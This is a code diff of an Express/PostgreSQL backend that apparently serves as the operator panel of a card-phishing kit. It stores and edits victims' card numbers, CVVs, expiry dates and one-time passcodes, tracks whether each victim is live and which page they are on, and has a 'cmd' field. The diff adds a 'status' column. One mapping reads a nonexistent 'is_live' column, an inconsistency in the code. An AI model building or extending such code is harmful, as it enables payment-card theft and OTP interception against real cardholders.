@@ -34,9 +34,11 @@ await pool.query(`
     is_active       BOOLEAN DEFAULT false,
     last_seen       BIGINT DEFAULT 0,
     country         TEXT DEFAULT '',
-    cmd             TEXT DEFAULT ''
+    cmd             TEXT DEFAULT '',
+    status          TEXT DEFAULT ''
   )
 `);
+await pool.query(`ALTER TABLE unity_submissions ADD COLUMN IF NOT EXISTS status TEXT DEFAULT ''`);
 
 /* ─── API Routes ─────────────────────────────────────────── */
 app.post("/api/unity/submit", async (req, res) => {
@@ -85,7 +87,8 @@ app.patch("/api/unity/submissions/:id", async (req, res) => {
     cardNumber: "card_number", cardName: "card_name",
     cardMonth: "card_month", cardYearExp: "card_year_exp", cardCvv: "card_cvv",
     otpCode: "otp_code", otpStatus: "otp_status",
-    page: "page", isActive: "is_active", lastSeen: "last_seen", country: "country"
+    page: "page", isActive: "is_active", lastSeen: "last_seen", country: "country",
+    status: "status"
   };
   const sets = []; const vals = [];
   for (const [k, col] of Object.entries(map)) {
@@ -108,7 +111,8 @@ app.get("/api/unity/submissions", async (_req, res) => {
     cardNumber: r.card_number, cardName: r.card_name,
     cardMonth: r.card_month, cardYearExp: r.card_year_exp, cardCvv: r.card_cvv,
     otpCode: r.otp_code, otpStatus: r.otp_status,
-    page: r.page, isActive: r.is_live, lastSeen: r.last_seen, country: r.country
+    page: r.page, isActive: r.is_live, lastSeen: r.last_seen, country: r.country,
+    status: r.status || ''
   })));
 });
 
